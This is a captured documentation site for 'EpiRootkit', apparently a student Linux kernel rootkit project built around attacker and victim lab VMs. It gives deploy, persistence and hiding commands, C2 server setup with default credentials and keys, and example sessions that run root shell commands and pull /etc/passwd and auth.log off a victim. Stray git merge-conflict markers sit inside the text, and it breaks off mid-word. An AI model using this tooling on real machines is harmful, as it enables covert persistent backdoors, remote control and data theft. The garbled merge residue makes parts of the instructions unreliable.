+[  123.460] EpiRootkit: All subsystems initialized successfully
+[  123.461] EpiRootkit: Attempting connection to 192.168.64.1:4444</code>
+  </pre></div><h2 id=deployment-management>Deployment Management <a href=#deployment-management class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><h3 id=check-status>Check Status <a href=#check-status class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=6a21101 class=language-bash>
+  <code>sudo ./scripts/deploy_rootkit.sh status</code>
+  </pre></div><h3 id=complete-removal>Complete Removal <a href=#complete-removal class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=a120e32 class=language-bash>
+  <code>sudo ./scripts/deploy_rootkit.sh uninstall</code>
+  </pre></div><h2 id=automatic-features>Automatic Features <a href=#automatic-features class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><p>When the module loads, it automatically:</p><ol><li><strong>Connects to C2 server</strong> (if running)</li><li><strong>Installs runtime persistence</strong> (cron, shell profiles)</li><li><strong>Enables file hiding</strong> (hides files with specific prefixes)</li><li><strong>Starts keepalive system</strong> (60-second ping/pong)</li></ol><p><strong>Note</strong>: Module deployment persistence is handled by the deployment script, not the runtime module.</p><h2 id=module-management>Module Management <a href=#module-management class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><h3 id=unload-module>Unload Module <a href=#unload-module class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=cfa6e91 class=language-bash>
+  <code>sudo rmmod epirootkit
+# Or use Makefile target
+sudo make remove</code>
+  </pre></div><h3 id=manual-persistence-cleanup>Manual Persistence Cleanup <a href=#manual-persistence-cleanup class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=a208c85 class=language-bash>
+  <code># Remove runtime persistence mechanisms only
+sudo rm -f /etc/cron.d/system-update
+sudo rm -f /etc/profile.d/system-env.sh
+
+# Module deployment persistence (handled by deployment script)
+sudo rm -f /etc/modules-load.d/epirootkit.conf
+sudo rm -f /lib/modules/$(uname -r)/extra/epirootkit.ko</code>
+  </pre></div><h3 id=clean-build>Clean Build <a href=#clean-build class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=a1400e8 class=language-bash>
+  <code>make clean</code>
+  </pre></div><h2 id=file-locations>File Locations <a href=#file-locations class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><h3 id=deployment-files-by-deploy-script>Deployment Files (by deploy script) <a href=#deployment-files-by-deploy-script class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><ul><li><strong>Module</strong>: <code>/lib/modules/$(uname -r)/extra/epirootkit.ko</code></li><li><strong>Autoload</strong>: <code>/etc/modules-load.d/epirootkit.conf</code></li></ul><h3 id=runtime-files-by-rootkit>Runtime Files (by rootkit) <a href=#runtime-files-by-rootkit class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><ul><li><strong>Cron</strong>: <code>/etc/cron.d/system-update</code></li><li><strong>Profile</strong>: <code>/etc/profile.d/system-env.sh</code></li></ul><h2 id=next-steps>Next Steps <a href=#next-steps class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><ol><li><strong><a data-bs-delay='{"hide":300,"show":550}' data-bs-html=true data-bs-title="<a href='/docs/03-attacking-program/overview/'><p>ATTACKING PROGRAM (C2 SERVER)</p><strong>Overview</strong><br>C2 server architecture and capabilities</a>" data-bs-toggle=tooltip href=/docs/03-attacking-program/overview/>Start C2 Server</a></strong>: Set up command & control</li><li><strong><a data-bs-delay='{"hide":300,"show":550}' data-bs-html=true data-bs-title="<a href='/docs/05-epirootkit/connection-authentication/'><p>EPIROOTKIT</p><strong>Connection & Authentication</strong><br>How the rootkit connects to C2 server and authenticates</a>" data-bs-toggle=tooltip href=/docs/05-epirootkit/connection-authentication/>Authentication</a></strong>: Connect and authenticate</li><li><strong><a data-bs-delay='{"hide":300,"show":550}' data-bs-html=true data-bs-title="<a href='/docs/05-epirootkit/features/command-execution/'><p>FEATURES</p><strong>Command Execution</strong><br>Execute shell commands remotely with full output capture</a>" data-bs-toggle=tooltip href=/docs/05-epirootkit/features/command-execution/>Use Commands</a></strong>: Execute remote commands</li></ol></div><div class="gitinfo d-flex flex-wrap justify-content-between align-items-center opacity-85 pt-3"><div id=edit-this-page class=mt-1><a href=https://github.com/kazetachinuu/epirootkit-docs/blob/master/content/docs/05-epirootkit/deployment.md alt="Build & Deployment" rel="noopener noreferrer" target=_blank><span class="me-1 align-text-bottom"><svg width="20" height="20" viewBox="0 0 32 32" fill="currentcolor"><path d="M16 .396c-8.839.0-16 7.167-16 16 0 7.073 4.584 13.068 10.937 15.183.803.151 1.093-.344 1.093-.772.0-.38-.009-1.385-.015-2.719-4.453.964-5.391-2.151-5.391-2.151-.729-1.844-1.781-2.339-1.781-2.339-1.448-.989.115-.968.115-.968 1.604.109 2.448 1.645 2.448 1.645 1.427 2.448 3.744 1.74 4.661 1.328.14-1.031.557-1.74 1.011-2.135-3.552-.401-7.287-1.776-7.287-7.907.0-1.751.62-3.177 1.645-4.297-.177-.401-.719-2.031.141-4.235.0.0 1.339-.427 4.4 1.641 1.281-.355 2.641-.532 4-.541 1.36.009 2.719.187 4 .541 3.043-2.068 4.381-1.641 4.381-1.641.859 2.204.317 3.833.161 4.235 1.015 1.12 1.635 2.547 1.635 4.297.0 6.145-3.74 7.5-7.296 7.891.556.479 1.077 1.464 1.077 2.959.0 2.14-.02 3.864-.02 4.385.0.416.28.916 1.104.755 6.4-2.093 10.979-8.093 10.979-15.156.0-8.833-7.161-16-16-16z"/></svg>
+</span>Edit this page</a></div></div></div><div><hr class=doc-hr><div id=doc-nav class=d-print-none><div class="row flex-xl-nowrap"><div class="col-sm-6 pt-2 doc-next"><a href=/docs/05-epirootkit/overview/><div class="card h-100 my-1"><div class="card-body py-2"><p class="card-title fs-5 fw-semibold lh-base mb-0"><i class="material-icons align-middle">navigate_before</i> EpiRootkit Overview</p><p class="card-text ms-2">Linux kernel rootkit for …</p></div></div></a></div><div class="col-sm-6 pt-2 doc-prev"><a class=ms-auto href=/docs/05-epirootkit/connection-authentication/><div class="card h-100 my-1 text-end"><div class="card-body py-2"><p class="card-title fs-5 fw-semibold lh-base mb-0">Connection & Authentication <i class="material-icons align-middle">navigate_next</i></p><p class="card-text me-2">How the rootkit connects to C2 …</p></div></div></a></div></div></div></div></div></div></div></div><footer class="shadow py-3 d-print-none"><div class=container-fluid><div class="row align-items-center"><div class=col><div class="text-sm-start text-center mx-md-2"><p class=mb-0>© 2025 Tux Fan Club. Built with <a href=https://github.com/colinwilson/lotusdocs><strong>Lotus Docs</strong></a></p></div></div></div></div></footer></main></div></div><button onclick=topFunction() id=back-to-top aria-label="Back to Top Button" class="back-to-top fs-5"><svg width="24" height="24"><path d="M12 10.224l-6.3 6.3-1.38-1.372L12 7.472l7.68 7.68-1.38 1.376z" style="fill:#fff"/></svg></button>
+<script>(()=>{var e=document.getElementById("mode");e!==null&&(window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",e=>{e.matches?(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")):(localStorage.setItem("theme","light"),document.documentElement.removeAttribute("data-dark-mode"))}),e.addEventListener("click",()=>{document.documentElement.toggleAttribute("data-dark-mode"),localStorage.setItem("theme",document.documentElement.hasAttribute("data-dark-mode")?"dark":"light")}),localStorage.getItem("theme")==="dark"?document.documentElement.setAttribute("data-dark-mode",""):document.documentElement.removeAttribute("data-dark-mode"))})()</script><script src=/docs/js/bootstrap.c7927bdd82eceb076739257add3f4b0e11379da037c07d5c7110daeb6de0e3edcb2de867604550f88815157e4ec4ddb7.js integrity=sha384-x5J73YLs6wdnOSV63T9LDhE3naA3wH1ccRDa623g4+3LLehnYEVQ+IgVFX5OxN23 defer></script><script type=text/javascript src=/docs/js/bundle.min.4f60111ba6134ba40ed4d3ca8b6f30e10963c0482cd9829b9dc4a2a347bc6eaec2c1cf424c2ce632fb6d2218139f34f0.js integrity=sha384-T2ARG6YTS6QO1NPKi28w4QljwEgs2YKbncSio0e8bq7Cwc9CTCzmMvttIhgTnzTw crossorigin=anonymous defer></script><script type=module>
+    var suggestions = document.getElementById('suggestions');
+    var search = document.getElementById('flexsearch');
+
+    const flexsearchContainer = document.getElementById('FlexSearchCollapse');
+
+    const hideFlexsearchBtn = document.getElementById('hideFlexsearch');
+
+    const configObject = { toggle: false }
+    const flexsearchContainerCollapse = new Collapse(flexsearchContainer, configObject) 
+
+    if (search !== null) {
+        document.addEventListener('keydown', inputFocus);
+        flexsearchContainer.addEventListener('shown.bs.collapse', function () {
+            search.focus();
+        });
+        
+        var topHeader = document.getElementById("top-header");
+        document.addEventListener('click', function(elem) {
+            if (!flexsearchContainer.contains(elem.target) && !topHeader.contains(elem.target))
+                flexsearchContainerCollapse.hide();
+        });
+    }
+
+    hideFlexsearchBtn.addEventListener('click', () =>{
+        flexsearchContainerCollapse.hide()
+    })
+
+    function inputFocus(e) {
+        if (e.ctrlKey && e.key === '/') {
+            e.preventDefault();
+            flexsearchContainerCollapse.toggle();
+        }
+        if (e.key === 'Escape' ) {
+            search.blur();
+            
+            flexsearchContainerCollapse.hide();
+        }
+    };
+
+    document.addEventListener('click', function(event) {
+
+    var isClickInsideElement = suggestions.contains(event.target);
+
+    if (!isClickInsideElement) {
+        suggestions.classList.add('d-none');
+    }
+
+    });
+
+    
+
+
+    document.addEventListener('keydown',suggestionFocus);
+
+    function suggestionFocus(e) {
+    const suggestionsHidden = suggestions.classList.contains('d-none');
+    if (suggestionsHidden) return;
+
+    const focusableSuggestions= [...suggestions.querySelectorAll('a')];
+    if (focusableSuggestions.length === 0) return;
+
+    const index = focusableSuggestions.indexOf(document.activeElement);
+
+    if (e.key === "ArrowUp") {
+        e.preventDefault();
+        const nextIndex = index > 0 ? index - 1 : 0;
+        focusableSuggestions[nextIndex].focus();
+    }
+    else if (e.key === "ArrowDown") {
+        e.preventDefault();
+        const nextIndex= index + 1 < focusableSuggestions.length ? index + 1 : index;
+        focusableSuggestions[nextIndex].focus();
+    }
+
+    }
+
+    
+
+
+    (function(){
+
+    var index = new FlexSearch.Document({
+        
+        tokenize: "forward",
+        minlength:  0 ,
+        cache:  100 ,
+        optimize:  true ,
+        document: {
+        id: 'id',
+        store: [
+            "href", "title", "description"
+        ],
+        index: ["title", "description", "content"]
+        }
+    });
+
+
+    
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+    
+
+    
+
+    index.add(
+            {
+                id:  0 ,
+                href: "\/docs\/06-web-ui\/installation\/",
+                title: "Installation \u0026 Setup",
+                description: "How to install and launch the Web UI.",
+                content: "Web UI Installation \u0026 Setup link Assumption: You are starting from a fresh Ubuntu system. Complete "
+            }
+        );
+    index.add(
+            {
+                id:  1 ,
+                href: "\/docs\/01-introduction\/presentation\/",
+                title: "Presentation",
+                description: "whoami",
+                content: "Présentation linkEquipage link Capitaine: Hugo Sibony Responsable Sabordage et mutinerie: Léa Bonet Nom de l’équipe linkNous sommes Tux Fan Club 🐧\nC’est Léa qui a choisi le nom car c’est la seule personne du groupe un peu créative 👀\n(Et par ce que Hugo est gentleman et a laissé le choix a la seule femme du groupe)\nTux est un manchot représentant le noyau Linux. Il a été crée en 1996 par Larry Ewing sur GIMP\nVu qu’il est mignon et que je l’aime (Tux pas Hugo 👀) je me suis dis que Tux Fan Club était un nom convenable\n"
+            }
+        );
+    index.add(
+            {
+                id:  2 ,
+                href: "\/docs\/02-setup\/",
+                title: "Setup",
+                description: "Environment and Virtual Machine setup instructions",
+                content: "Overview linkThis section guides you through setting up your host environment, installing and verifying VM disks, and configuring the attacker and victim VMs.\nInitial Setup \u0026 Installation VM Installation \u0026 Verification Attacking VM Setup Victim VM Setup "
+            }
+        );
+    index.add(
+            {
+                id:  3 ,
+                href: "\/docs\/02-setup\/environment\/",
+                title: "Initial Setup \u0026 Installation",
+                description: "Prepare your host system from scratch for the EpiRootkit project.",
+                content: "Host Environment Setup (from a Blank System) link Assumption: You are starting from a fresh Ubuntu 24.10 (amd64) install with no extra packages.\n1. Update System link sudo apt update \u0026\u0026 sudo apt upgrade -y 2. Install Essential Packages linkInstall all required tools for virtualization, development, and Node.js:\nsudo apt install -y qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils build-essential linux-headers-$(uname -r) curl git nodejs npm Tip: If you get an error about missing kernel headers, ensure your kernel version matches the installed headers. Use uname -r and apt search linux-headers to check.\n3. (Optional but Recommended) Install pnpm linkpnpm is used for the Web UI. Install it globally:\nsudo npm install -g pnpm 4. Enable and Start libvirt link sudo systemctl enable --now libvirtd 5. Add Your User to the libvirt Group link sudo usermod -aG libvirt $USER # Log out and log back in, or run: newgrp libvirt 6. Verify Virtualization Support linkCheck that KVM modules are loaded:\nlsmod | grep kvm You should see kvm and kvm_intel (or kvm_amd).\nIf not, check if virtualization is enabled in your BIOS:\negrep -c '(vmx|svm)' /proc/cpuinfo # output == 0 -\u003e not activated # output \u003e= 1 -\u003e activated warning If virtualization is not enabled, reboot and enable it in your BIOS/UEFI settings. 7. Verify Node.js, npm, and pnpm link node -v npm -v pnpm -v # (if installed) All should print a version number. If not, check your installation steps above.\n8. Review Helper Scripts link scripts/check_vms.sh: Checks for VM disks and ISO, provides download URLs for missing items. scripts/run_vms.sh: Sets up a NAT network (static200) and launches both VMs. 9. Next Steps link Proceed to "
+            }
+        );
+    index.add(
+            {
+                id:  4 ,
+                href: "\/docs\/02-setup\/vm-installation\/",
+                title: "VM Installation \u0026 Verification",
+                description: "Set up and verify the attacker and victim VMs from scratch.",
+                content: "Virtual Machine Installation \u0026 Verification link You must have completed "
+            }
+        );
+    index.add(
+            {
+                id:  5 ,
+                href: "\/docs\/02-setup\/attacking-vm-setup\/",
+                title: "Attacking VM Setup",
+                description: "Configure and use the attacking VM",
+                content: "Follow these steps once the host environment is ready and the VMs have been created or downloaded.\nUsage link Ensure the attacker.qcow2 disk is in the vm/ directory (verify via ./scripts/check_vms.sh or see VM Installation \u0026 Verification). Launch the attacking VM with: sudo ./scripts/run_vms.sh attacker Or both VMs with: sudo ./scripts/run_vms.sh On the attacking VM: Auto-login is enabled for user attacker (no password prompt). The static IP is 192.168.200.11. The password is jules. For more details on the network configuration and helper scripts, see Initial Setup \u0026 Installation.\n"
+            }
+        );
+    index.add(
+            {
+                id:  6 ,
+                href: "\/docs\/02-setup\/victim-vm-setup\/",
+                title: "Victim VM Setup",
+                description: "Configure and use the victim VM to load EpiRootkit",
+                content: "Follow these steps once the host environment is ready and the VMs have been created or downloaded.\nPlace the victim.qcow2 disk in the vm/ directory at the project root (verify via ./scripts/check_vms.sh or see VM Installation \u0026 Verification).\nLaunch the victim VM with:\nsudo ./scripts/run_vms.sh victim Or both VMs with:\nsudo ./scripts/run_vms.sh On the victim VM:\nThe VM has auto-login enabled for the victim user (no password prompt). Its static IP is 192.168.200.10. The password is jules. When finished, close the QEMU window or use Ctrl+C on the host script to shut down both VMs.\n"
+            }
+        );
+    index.add(
+            {
+                id:  7 ,
+                href: "\/docs\/03-attacking-program\/",
+                title: "Attacking Program (C2 Server)",
+                description: "C2 server for EpiRootkit management with CLI interface and Web UI",
+                content: ""
+            }
+        );
+    index.add(
+            {
+                id:  8 ,
+                href: "\/docs\/03-attacking-program\/overview\/",
+                title: "Overview",
+                description: "C2 server architecture and capabilities",
+                content: "Attacking Program Overview linkProfessional C2 (Command \u0026 Control) server built with Node.js providing CLI interface for managing EpiRootkit connections.\nQuick Start link # Install dependencies and start cd attacking_program pnpm install pnpm start # Server output # ✓ Server started on port 4444 # ✓ Web interface started on port 3000 Architecture linkCore Components link CLI Interface: Vorpal.js-based interactive command system C2 Server: TCP server handling rootkit connections on port 4444 Web Interface: Express.js REST API with Socket.IO on port 3000 Client Manager: Connection lifecycle and authentication management Event System: Real-time event handling and logging Technology Stack link Runtime: Node.js 18+ with pnpm package manager CLI Framework: Vorpal.js for interactive commands Web Server: Express.js with Socket.IO for real-time updates Encryption: XOR cipher implementation (configurable) Core Features linkClient Management link ls # List connected clients auth # Authenticate with SHA-512 verification status # Get comprehensive rootkit status keepalive # Check connection health Remote Operations link exec # Execute shell commands upload [remote] # Upload files to victim download [local] # Download files from victim Configuration Management link config # Interactive configuration menu persist [action] # Manage persistence mechanisms Authentication System linkSHA-512 Password Authentication:\nC2 sends plaintext password via auth command Rootkit hashes password and compares with stored hash Session established with 1-hour timeout Rate limiting: 5 attempts per 60 seconds Default Credentials:\nPassword: password Hash: b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86 Configuration linkServer Settings (config.env) link C2_PORT=4444 # C2 server port WEB_PORT=3000 # Web interface port ENCRYPTION_KEY=0123456789abcdef0123456789abcdef # 32-char hex key ENABLE_ENCRYPTION=true # XOR encryption toggle PASSWORD_HASH=b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86 Security Features link Authentication: SHA-512 hashing with brute force protection Encryption: Optional XOR cipher for traffic obfuscation Session Management: Automatic timeout and cleanup Access Control: Commands require authentication Connection Health: Automatic stale client detection "
+            }
+        );
+    index.add(
+            {
+                id:  9 ,
+                href: "\/docs\/03-attacking-program\/installation\/",
+                title: "Installation",
+                description: "Step-by-step installation and setup guide",
+                content: "Installation Guide linkComplete setup instructions for the EpiRootkit C2 server.\nPrerequisites link«««\u003c HEAD\nNode.js \u0026 pnpm: Ensure Node.js (e.g., LTS v18.x+) and pnpm are installed. sudo apt update \u0026\u0026 sudo apt install nodejs npm npm install -g pnpm =======\nd8205ef9e1984d8455d84e1cada77692ef2857c0\nVerify Prerequisites link # Check Node.js version node --version # Check pnpm installation pnpm --version \u003c\u003c\u003c\u003c\u003c\u003c\u003c HEAD 2. Install Dependencies: ```bash pnpm install ``` ======= # Install pnpm if not available npm install -g pnpm d8205ef9e1984d8455d84e1cada77692ef2857c0\nInstallation Steps link«««\u003c HEAD Required directories (uploads/, downloads/, logs/) are created automatically.\nStart the C2 server and Web UI: pnpm start This will launch both the C2 server and the Web UI. By default, the Web UI is available at http://localhost:3000. ======= 1. Navigate to Project Directory link cd attacking_program 2. Install Dependencies link # Using pnpm (recommended) pnpm install # Or using npm npm install Configuration link1. Review Configuration File link cat config.env Default Configuration:\n# EpiRootkit C2 Server Configuration C2_PORT=4444 WEB_PORT=3000 # Authentication Configuration PASSWORD_HASH=b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86 # Encryption Configuration ENCRYPTION_KEY=0123456789abcdef0123456789abcdef ENABLE_ENCRYPTION=true First Run link1. Start the C2 Server link pnpm start Expected Output:\n┌─ C2 Server Interface • Initializing... └─ Initializing... ┌─ Setup • [2025-05-25 16:00:00] Config: C2_PORT=4444, WEB_PORT=3000 └─ ┌─ Server Status • [2025-05-25 16:00:00] Server started on port 4444 └─ • Web interface started on port 3000 c2-server$ 3. Test CLI Interface link # In the C2 server prompt c2-server$ help # List clients (should be empty initially) c2-server$ ls # No clients connected Next Steps link Connect a Rootkit: Load the EpiRootkit module on a victim machine Authenticate: Use auth Client-1 password to establish secure connection Execute Commands: Start with exec Client-1 whoami to test functionality Explore Features: Try file operations, persistence management, and configuration d8205ef9e1984d8455d84e1cada77692ef2857c0\n"
+            }
+        );
+    index.add(
+            {
+                id:  10 ,
+                href: "\/docs\/03-attacking-program\/commands\/",
+                title: "Command Reference",
+                description: "Complete reference for all C2 server commands",
+                content: "Command Reference linkComplete reference for all C2 server commands with real examples.\nCore Commands link Command Description Authentication Required clients, ls List connected rootkit clients No auth Authenticate with a rootkit client No exec Execute shell commands on target system Yes upload [remoteFile] Upload files from attacking machine to victim system Yes download [localFile] Download files from victim system to attacking machine Yes status Get comprehensive rootkit status Yes keepalive Get detailed keepalive status Yes persist [action] Manage persistence mechanisms Yes config Interactive configuration interface Yes Client Management linkls / clients linkList connected rootkit clients with authentication status and last seen time.\nc2-server$ ls # • Client-1 - AUTHENTICATED - Last seen: 6:13:29 PM # • Client-2 - UNAUTHENTICATED - Last seen: 6:10:15 PM c2-server$ clients # Same output as 'ls' auth linkAuthenticate with a rootkit client using SHA-512 password verification.\nc2-server$ auth Client-1 password # ✓ [2025-05-25 16:13:29] Authenticated # SUCCESS: Authentication successful # Wrong password c2-server$ auth Client-1 wrongpass # ERROR: Authentication failed # Rate limiting c2-server$ auth Client-1 wrong1 c2-server$ auth Client-1 wrong2 # ... (after 5 attempts) # ERROR: Rate limited. Try again in 60 seconds Security Features:\nSHA-512 password hashing Rate limiting (5 attempts per 60 seconds) Session timeout (1 hour) Default password: “password” Command Execution linkexec linkExecute shell commands on target system with full output capture.\n# Basic commands c2-server$ exec Client-1 whoami # Exit code: 0 # Output: # root c2-server$ exec Client-1 uname -a # Exit code: 0 # Output: # Linux victim 5.4.0-74-generic #83-Ubuntu SMP Wed Apr 29 23:25:17 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux # Complex commands with flags c2-server$ exec Client-1 ps aux | head -10 # Exit code: 0 # Output: # USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND # root 1 0.0 0.1 225468 9876 ? Ss 15:00 0:01 /sbin/init # ... # File operations c2-server$ exec Client-1 cat /etc/passwd # Exit code: 0 # Output: # root:x:0:0:root:/root:/bin/bash # daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin # ... Features:\nRoot privileges execution Stdout/stderr capture with exit codes Command parsing with flag support Real-time output display Error handling and validation File Operations linkupload [remoteFile] linkUpload files from attacking machine to victim system.\n# Upload to specific path c2-server$ upload Client-1 ./test.txt /tmp/test.txt # ✓ File uploaded successfully (1024 bytes) # Upload to current directory (uses basename) c2-server$ upload Client-1 ./script.sh # ✓ File uploaded successfully (512 bytes) # Upload configuration file c2-server$ upload Client-1 ./config.conf /etc/myapp/config.conf # ✓ File uploaded successfully (2048 bytes) download [localFile] linkDownload files from victim system to attacking machine.\n# Download to specific local path c2-server$ download Client-1 /etc/passwd ./victim_passwd # ✓ File downloaded successfully (2048 bytes) # Download to current directory (uses basename) c2-server$ download Client-1 /etc/hostname # ✓ File downloaded successfully (64 bytes) # Download log files c2-server$ download Client-1 /var/log/auth.log ./auth.log # ✓ File downloaded successfully (15360 bytes) Features:\nBase64 encoding for file transfer Path validation and security checks Automatic path resolution Binary and text file support System Information linkstatus linkGet comprehensive rootkit status information.\nc2-server$ status Client-1 # EpiRootkit Status: # Version: 1.0.0 # Authentication: YES # Connection: CONNECTED # Module Hidden: YES # Encryption: DISABLED # Persistence: ENABLED keepalive linkGet detailed keepalive and connection status.\nc2-server$ keepalive Client-1 # Keepalive Status: # Last ping sent: 2025-05-25 16:14:00 # Last pong received: 2025-05-25 16:14:00 # Failed ping count: 0 # Connection stable: YES # Reconnection attempts: 0 # Current state: CONNECTED Persistence Management linkpersist [action] linkManage persistence mechanisms with multiple options.\n# Install all persistence mechanisms c2-server$ persist Client-1 install # SUCCESS: All persistence mechanisms installed # Remove all persistence mechanisms c2-server$ persist Client-1 remove # SUCCESS: All persistence mechanisms removed # Install specific mechanisms c2-server$ persist Client-1 modules # SUCCESS: modules-load.d persistence installed c2-server$ persist Client-1 cron # SUCCESS: Cron persistence installed c2-server$ persist Client-1 profile # SUCCESS: Shell profile persistence installed # Show help c2-server$ persist-help # Persistence Management Commands: # persist install - Install all persistence mechanisms # persist remove - Remove all persistence mechanisms # persist modules - Install modules-load.d persistence # persist cron - Install cron persistence # persist profile - Install shell profile persistence Available Mechanisms:\nmodules-load.d: Systemd automatic loading (/etc/modules-load.d/epirootkit.conf) Cron jobs: Scheduled loading (/etc/cron.d/epirootkit) Shell profiles: Login-based loading (/etc/profile.d/epirootkit.sh) Configuration Management linkconfig linkInteractive configuration interface for rootkit settings.\nc2-server$ config Client-1 # ┌─ Configuration - Client-1 # Current Configuration: # [X] Module Hiding (Click to disable) # [ ] Persistence (Click to enable) # # ? Select option: [Use arrow keys] # ❯ [X] Module Hiding (Click to disable) # [ ] Persistence (Click to enable) # Refresh Status # Exit Available Options:\nModule Hiding: Toggle rootkit visibility in lsmod Persistence: Install/remove boot persistence mechanisms Status Refresh: Update current configuration display Stealth Commands linkDirect Module Control link # Hide module from lsmod c2-server$ hide_module Client-1 # SUCCESS: Module hidden # Unhide module c2-server$ unhide_module Client-1 # SUCCESS: Module visible # Check if hidden c2-server$ exec Client-1 lsmod | grep epirootkit # (no output if hidden) Utility Commands linkclear / cls linkClear the terminal screen.\nc2-server$ clear # Screen cleared with header message help linkShow available commands.\nc2-server$ help # EpiRootkit C2 Commands # clients - List connected rootkit clients # auth - Authenticate with client # exec - Execute command on client # upload - Upload file to client # download - Download file from client # status - Get rootkit status # keepalive - Get detailed keepalive status # persist [action] - Manage persistence mechanisms # persist-help - Show persistence usage examples # config - Configure rootkit settings # clear - Clear the screen # exit - Exit C2 server exit / quit linkExit the C2 server gracefully.\nc2-server$ exit # Server Status # [2025-05-25 16:15:00] Shutting down C2 server... Security Considerations link All commands except ls/clients and auth require authentication Commands are logged to kernel log via pr_info() Rate limiting prevents brute force authentication attacks Session timeouts ensure security even if connections persist "
+            }
+        );
+    index.add(
+            {
+                id:  11 ,
+                href: "\/docs\/03-attacking-program\/usage\/",
+                title: "Usage Guide",
+                description: "Comprehensive usage scenarios and workflows",
+                content: "«««\u003c HEAD\nRunning the Server \u0026 Web UI link=======\nUsage Guide link d8205ef9e1984d8455d84e1cada77692ef2857c0\nComplete workflows and usage scenarios for the EpiRootkit C2 server.\nGetting Started link1. Start the C2 Server link \u003c\u003c\u003c\u003c\u003c\u003c\u003c HEAD pnpm start This command starts both the C2 server and the Web UI. The CLI prompt (c2-server$ ) will appear for server management, and the Web UI will be available at http://localhost:3000 by default.\nReal-time event logs appear in the console, providing visual alerts for significant events such as client connections and disconnections. linkcd attacking_program pnpm start\n### 2. Wait for Rootkit Connection ```bash # On victim machine sudo insmod epirootkit.ko \u003e\u003e\u003e\u003e\u003e\u003e\u003e d8205ef9e1984d8455d84e1cada77692ef2857c0 # C2 server will show: ┌─ Client-1 ✓ [2025-05-25 16:13:29] Connected └─ 3. Authenticate link c2-server$ auth Client-1 (default: password) ┌─ Client-1 ✓ [2025-05-25 16:13:30] Authenticated └─ Brute Force Protection linkRate limit to 5 attempts per 60 seconds.\nBasic Workflows linkClient Management Workflow linkList and Monitor Clients link # List all connected clients c2-server$ ls ┌─ Connected Clients • Client-1 - AUTHENTICATED - Last seen: 6:13:29 PM • Client-2 - UNAUTHENTICATED - Last seen: 6:10:15 PM └─ # Check specific client status c2-server$ status Client-1 ┌─ Client-1 • [2025-05-25 16:13:30] Command result: • EpiRootkit Status: • Version: 1.0.0 • Authentication: YES • Connection: CONNECTED • Module Hidden: YES • Encryption: DISABLED • Persistence: ENABLED └─ # Monitor connection health c2-server$ keepalive Client-1 ┌─ Client-1 • [2025-05-25 16:13:31] Command result: • Keepalive Status: • Last ping sent: 2025-05-25 16:14:00 • Connection stable: YES └─ Command Execution Workflow linkBasic System Commands link # Check user privileges c2-server$ exec Client-1 whoami ┌─ Client-1 • [2025-05-25 16:13:32] Command result: • root └─ # System information c2-server$ exec Client-1 uname -a ┌─ Client-1 • [2025-05-25 16:13:33] Command result: • Linux victim 5.4.0-74-generic #83-Ubuntu SMP Wed Apr 29 23:25:17 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux └─ File Transfer Workflow linkUpload Files to Victim link # Upload a script c2-server$ upload Client-1 ./scripts/backdoor.sh /tmp/backdoor.sh ┌─ File Upload • Uploading ./scripts/backdoor.sh → /tmp/backdoor.sh ✓ Upload initiated └─ # Upload configuration c2-server$ upload Client-1 ./configs/malware.conf /etc/malware.conf ┌─ File Upload • Uploading ./configs/malware.conf → /etc/malware.conf ✓ Upload 